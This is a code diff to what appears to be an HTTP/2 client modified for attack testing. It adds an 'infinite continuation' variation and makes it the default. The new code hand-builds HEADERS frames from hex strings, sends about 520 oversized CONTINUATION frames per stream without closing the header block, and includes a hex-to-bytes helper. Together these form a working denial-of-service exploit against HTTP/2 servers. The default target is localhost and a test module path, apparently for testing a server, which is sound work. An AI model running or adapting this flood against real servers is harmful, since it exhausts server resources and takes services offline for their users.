@@ -15,6 +15,7 @@
 package io.netty.example.http2.helloworld.client;
 
 import io.netty.bootstrap.Bootstrap;
+import io.netty.buffer.ByteBuf;
 import io.netty.buffer.Unpooled;
 import io.netty.channel.Channel;
 import io.netty.channel.ChannelFuture;
@@ -67,9 +68,9 @@ public final class Http2Client {
 
     static final boolean SSL = System.getProperty("ssl") != null;
     static final String HOST = System.getProperty("host", "127.0.0.1");
-    static final int PORT = Integer.parseInt(System.getProperty("port", SSL? "8443" : "8080"));
-    static final String URL = System.getProperty("url", "/whatever");
-    static final int TRIES = Integer.parseUnsignedInt(System.getProperty("tries", "10"));
+    static final int PORT = Integer.parseInt(System.getProperty("port", SSL? "8443" : "8030"));
+    static final String URL = System.getProperty("url", "/H2TestModule/H2HeadersAndBody");
+    static final int TRIES = Integer.parseUnsignedInt(System.getProperty("tries", "1"));
     static final boolean ENABLE_LOGGING = Boolean.getBoolean("enable_frame_logging");
     static final long STREAM_SPREAD_SLEEP = Long.parseUnsignedLong(System.getProperty("stream_spread_sleep", "20"));
     static final int THREAD_NUMBER = Integer.parseUnsignedInt(System.getProperty("thread_number", "100"));
@@ -78,7 +79,7 @@ public final class Http2Client {
     // 1 Unending stream requests and resets
     // 2 Batch of stream requests/resets
     // 3 Unending stream of requests (exceeding maxConcurrentStreams)
-    static final int ATTACK_VARIATION = Integer.parseUnsignedInt(System.getProperty("attack", "1"));
+    static final int ATTACK_VARIATION = Integer.parseUnsignedInt(System.getProperty("attack", "5"));
 
     public static void main(String[] args) throws Exception {
         // Configure SSL.
@@ -155,6 +156,14 @@ public final class Http2Client {
                         System.out.println();
                         runRapidRequestNoResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
                         break;
+                    case 5:
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("*****  !!! RUNNING INFINITE CONTINUATION VARIATION !!!  *****");
+                        System.out.println("***********************************************************");
+                        System.out.println();
+                        runInfiniteContinuationVariation(initializer, http2SettingsHandler.ctx, request, executor);
+                        break;
                     default:
                         invalidAttack = true;
                         System.out.println();
@@ -224,6 +233,80 @@ public final class Http2Client {
         request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
         request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
         return request;
+    }
+
+    static String extraLongContinuationBlock = "0003ea090000X03e8426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f426c6168426c6168426c6168426c6168426c612f";
+
+    public static void runInfiniteContinuationVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
+        // Variation of sending infinite continuation headers
+        // Start all the streams possibly allowed and reset them straight after requesting
+        
+        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+        Channel channel = ctx.channel();
+        System.out.println("Going until streams: " + maxConcurrentStreams);
+        // String size = "000046";
+        String finalContinuationBlock = "000000090400X";
+        String extraPathContinuationBlock = "000049090400X14472f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f";
+        String dataBlock = "000006000100X414243313233";
+        // String header1 = "000d637573746f6d4865616465723100155468697320697320637573746f6d48656164657231";
+        // int continuationsToWrite = Integer.MAX_VALUE;
+        maxConcurrentStreams = 7;
+        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
+            int continuationsToWrite = 520;
+            // Send headers for new stream
+            if (!channel.isOpen()) {
+                System.out.println("Channel: "+ channel + " was closed...");
+                break;
+            }
+            initializer.connectionHandler().connection().local().createStream(streamId, false);
+            System.out.println("Starting new stream: "+ streamId+ "...");
+            ByteBuf header = Unpooled.wrappedBuffer(hexStringToByteArray("000022010000X8286141e2f4832546573744d6f64756c652f483248656164657273416e64426f6479".replaceFirst("X", String.format("%06x", streamId))));
+            // No path
+            ByteBuf header2 = Unpooled.wrappedBuffer(hexStringToByteArray("000002010000X8286".replaceFirst("X", String.format("%06x", streamId))));
+            // Extra long path /test/test/test/test/test/test/test/test/test/test/test/test/test/test/
+            ByteBuf header3 = Unpooled.wrappedBuffer(hexStringToByteArray("00004b010000X828614472f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f746573742f".replaceFirst("X", String.format("%06x", streamId))));
+            if(streamId == 7) channel.writeAndFlush(header2);
+            else if(streamId == 3) channel.writeAndFlush(header3);
+            else channel.writeAndFlush(header);
+            while (continuationsToWrite > 0) {
+                // Send continuations
+                ByteBuf continuation = Unpooled.wrappedBuffer(hexStringToByteArray(extraLongContinuationBlock.replaceFirst("X", String.format("%06x", streamId))));
+                if (!channel.isOpen() || initializer.responseHandler().lastSeenStream >= streamId) {
+                    System.out.println("Channel/Stream: "+ channel + " was closed...");
+                    break;
+                }
+                if(streamId == 5)
+                channel.writeAndFlush(continuation);
+                Thread.sleep(STREAM_SPREAD_SLEEP);
+                continuationsToWrite--;
+            }
+            // Send final block to close up headers
+            if (continuationsToWrite <= 0) {
+                // Send final continuation
+                ByteBuf continuation = Unpooled.wrappedBuffer(hexStringToByteArray(finalContinuationBlock.replaceFirst("X", String.format("%06x", streamId))));
+                if (!channel.isOpen() || initializer.responseHandler().lastSeenStream >= streamId) {
+                    System.out.println("Channel/Stream: "+ channel + " was closed...");
+                    break;
+                }
+                // if(streamId == 7)
+                //     channel.writeAndFlush(Unpooled.wrappedBuffer(hexStringToByteArray(extraPathContinuationBlock.replaceFirst("X", String.format("%06x", streamId)))));
+                // else
+                    channel.writeAndFlush(continuation);
+                Thread.sleep(STREAM_SPREAD_SLEEP);
+                channel.writeAndFlush(Unpooled.wrappedBuffer(hexStringToByteArray(dataBlock.replaceFirst("X", String.format("%06x", streamId)))));
+            }
+        }
+        Thread.sleep(3000);
+    }
+
+    public static byte[] hexStringToByteArray(String s) {
+        int len = s.length();
+        byte[] data = new byte[len / 2];
+        for (int i = 0; i < len; i += 2) {
+            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
+                                + Character.digit(s.charAt(i+1), 16));
+        }
+        return data;
     }
 
     public static void runRapidResetVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, FullHttpRequest request, ExecutorService executor) throws Exception{
